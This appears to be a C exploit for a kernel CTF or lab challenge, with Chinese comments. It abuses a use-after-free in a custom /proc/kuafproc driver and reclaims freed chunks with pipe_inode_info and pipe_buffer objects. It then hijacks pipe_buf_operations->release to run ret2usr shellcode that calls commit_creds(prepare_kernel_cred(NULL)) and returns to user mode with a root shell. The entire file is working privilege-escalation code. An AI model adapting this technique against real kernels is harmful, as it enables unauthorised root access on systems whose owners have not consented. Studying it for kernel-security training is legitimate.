//gcc -masm=intel -static exploit.c -o exploit
//home/heap/uaf/pipe/ret2usr/exploit
// b *(0x402F1A)

#define _GNU_SOURCE
#include "mykernelpwn.h"

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    size_t size;
    char* data;
};

int kuaf_fd;

void kuaf_add(size_t idx, size_t size, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}


void kuaf_edit(size_t idx, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}

// kfree(&notebook[idx]->data)
void kuaf_del(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x334455, &note);
}

void kuaf_gift(void* buf)
{
    struct kuaf_note note = {
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x445566, &note);
}

// 把 notebook[idx]->data 数据读到 buf
ssize_t kuaf_read(int idx, void* buf)
{
    return read(kuaf_fd, buf, idx);
}

long   seq_fd;
size_t root_rip;

void shellcode(void)
{
    __asm__(
        "mov r12, [rsp + 0x8];"
        "sub r12, 0x1f5864;"    
        "mov r13, r12;"
        "add r12, 0;"  
        "sub r13, 0x3b0;"
        "xor rdi, rdi;"
        "call r12;"         // 执行 prepare_kernel_cred(null)
        "mov rdi, rax;"
        "call r13;"         // 执行 commit_creds(prepare_kernel_cred(null))
        "mov r14, r13;"
        "add r14, 0xb489da;"
        "push user_ss;"
        "mov r15, user_sp;"
        "add r15, 8;"       // user_sp + 8
        "push r15;"
        "push user_rflags;"
        "push user_cs;"
        "push root_rip;"
        "push 0;"
        "call r14;"          // swapgs_restore_regs_and_return_to_usermode+22
    );
}

int main(int argc, char** argv, char** envp)
{
    size_t  buf[0x100], pipe_buffer_addr;
    int pipe_fd[2];

    save_status();
    bind_core(0);

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    memset(buf, 'A', sizeof(buf));
    // pipe_inode_info 大小
    kuaf_add(0x10, 192, buf);
    kuaf_add(0x11, 192, buf);
    kuaf_del(0x10);
    kuaf_del(0x11);
    // pipe_buffer 大小
    kuaf_add(0x12, 1024, buf);
    kuaf_add(0x13, 1024, buf);
    kuaf_del(0x12);
    kuaf_del(0x13);     // rop heap
    // 分配 pipe_inode_info, pipe_buffer
    pipe(pipe_fd);

    kuaf_read(0x11, buf);
    print_binary(buf, 192);
    pipe_buffer_addr = buf[15];
    printf("\033[32m\033[1m[+] Got pipe_buffer: %p\033[0m\n", pipe_buffer_addr);

    root_rip = (size_t)get_root_shell;
    // pipe_buffer
    buf[0] = 0;
    buf[1] = 0;
    buf[2] = pipe_buffer_addr + 0x18;  // pipe_buffer->ops
    // pipe_buf_operations
    buf[3] = 0;
    buf[4] = 0;     
    buf[5] = (size_t)shellcode;     // pipe_buf_operations->release 执行 shellcode 函数
    kuaf_edit(0x13, buf);

    note_info("Trigerring pipe_buf_operations->release()...");
    close(pipe_fd[1]);
    close(pipe_fd[0]);

    return 0;
}